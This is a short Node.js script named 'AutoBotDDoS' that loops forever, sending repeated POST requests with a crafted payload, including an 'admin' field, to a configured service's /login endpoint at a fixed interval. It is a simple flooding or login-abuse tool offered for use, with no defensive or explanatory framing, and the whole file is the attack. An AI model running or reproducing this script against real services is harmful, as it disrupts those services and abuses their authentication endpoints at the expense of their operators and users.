// AutoBotDDoS (2024)
// Copyright (c) 2024 Rui Reogo
// Licensed under the MIT License

// import necessary things
const config = require('./conf.json');
const utils = require('./utils');
const axios = require('axios');

const run = async () => {
  const {
    AUTOBOT_URL,
    TIME_INTERVAL
  } = config;
  const xurl = AUTOBOT_URL + "/login";

  while (true) {
    try {
      const state = utils.getState();
      const res = await axios.post(xurl, {
        state,
        commands: [],
        prefix: '/',
        admin: 69
      });

      if (res) console.log("successfully sent one!");
      await utils.sleep(TIME_INTERVAL);
    } catch {
      console.error("error sendin' one =(");
    };
  };
};

run();
